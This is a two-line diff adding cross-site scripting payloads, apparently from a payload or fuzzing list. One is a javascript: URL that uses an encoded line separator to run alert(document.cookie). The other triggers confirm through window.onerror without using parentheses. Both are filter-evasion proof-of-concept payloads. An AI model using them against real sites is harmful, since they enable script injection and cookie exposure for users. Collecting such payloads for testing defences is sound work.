@@ -1,0 +1,2 @@
+javascript://%e2%80%a8alert(document.cookie);
+a=8,b=confirm,c=window,c.onerror=b;throw-a
